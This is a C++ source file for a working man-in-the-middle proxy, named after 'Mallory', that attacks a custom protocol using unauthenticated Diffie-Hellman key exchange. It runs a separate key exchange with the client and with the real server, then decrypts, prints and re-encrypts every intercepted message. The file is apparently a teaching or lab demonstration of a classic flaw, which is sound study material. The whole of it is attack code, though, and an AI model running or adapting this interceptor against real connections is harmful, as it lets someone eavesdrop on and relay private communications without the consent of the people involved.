#include <iostream>
#include <string>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <thread>
#include "crypto_utils.h"

using namespace std;

void forward_traffic(int src_sock, int dst_sock, const string& src_name, const string& dst_name, string decrypt_key, string encrypt_key) {
    char buffer[8192];
    string leftover = "";
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(src_sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) break;
        
        string data = leftover + string(buffer);
        size_t pos = 0;
        while ((pos = data.find("\n")) != string::npos) {
            string enc_line = data.substr(0, pos);
            data.erase(0, pos + 1);
            if (enc_line.empty()) continue;

            // Decrypt with src key
            string dec = decrypt_aes_gcm(enc_line, decrypt_key);
            if (!dec.empty()) {
                if (dec.rfind("LOGIN ", 0) != 0 && dec.find("LOGIN_OK") != 0 && dec.rfind("WHO", 0) != 0) {
                    cout << "[MALLORY INTERCEPT] " << src_name << " -> " << dst_name << ": " << dec << "\n";
                }
                
                // Re-encrypt with dst key
                string re_enc = encrypt_aes_gcm(dec, encrypt_key);
                string packet = re_enc + "\n";
                send(dst_sock, packet.c_str(), packet.length(), 0);
            }
        }
        leftover = data;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cerr << "Usage: " << argv[0] << " <listen_port> <real_server_ip> <real_server_port>\n";
        return 1;
    }

    int listen_port = stoi(argv[1]);
    string real_server_ip = argv[2];
    int real_server_port = stoi(argv[3]);

    int proxy_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(proxy_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in proxy_addr;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_addr.s_addr = INADDR_ANY;
    proxy_addr.sin_port = htons(listen_port);

    bind(proxy_fd, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr));
    listen(proxy_fd, 5);

    cout << "Mallory MITM Proxy listening on port " << listen_port << "...\n";

    while (true) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(proxy_fd, (struct sockaddr*)&client_addr, &client_len);
        
        cout << "Victim connected to Mallory!\n";

        // Connect to Real Server
        int server_fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(real_server_port);
        inet_pton(AF_INET, real_server_ip.c_str(), &server_addr.sin_addr);
        connect(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));

        // 1. Mallory intercepts Client's DH_INIT
        char buffer[4096];
        memset(buffer, 0, sizeof(buffer));
        recv(client_fd, buffer, sizeof(buffer)-1, 0);
        string c_init(buffer);
        string client_pub = c_init.substr(8, c_init.find("\n") - 8);

        // 2. Mallory performs DH with Client
        DHKeyExchange dh_client;
        string mallory_pub_for_client = dh_client.get_public_key_hex();
        string client_key = dh_client.compute_shared_secret(client_pub);
        string m_ack = "DH_ACK " + mallory_pub_for_client + "\n";
        send(client_fd, m_ack.c_str(), m_ack.length(), 0);

        // 3. Mallory performs DH with Server
        DHKeyExchange dh_server;
        string mallory_pub_for_server = dh_server.get_public_key_hex();
        string m_init = "DH_INIT " + mallory_pub_for_server + "\n";
        send(server_fd, m_init.c_str(), m_init.length(), 0);

        memset(buffer, 0, sizeof(buffer));
        recv(server_fd, buffer, sizeof(buffer)-1, 0);
        string s_ack(buffer);
        string server_pub = s_ack.substr(7, s_ack.find("\n") - 7);
        string server_key = dh_server.compute_shared_secret(server_pub);

        cout << "[MITM] Fake Key with Client: " << client_key << "\n";
        cout << "[MITM] Fake Key with Server: " << server_key << "\n";
        cout << "[MITM] Transparent proxying started!\n";

        thread t1(forward_traffic, client_fd, server_fd, "Client", "Server", client_key, server_key);
        thread t2(forward_traffic, server_fd, client_fd, "Server", "Client", server_key, client_key);
        t1.detach();
        t2.detach();
    }

    return 0;
}

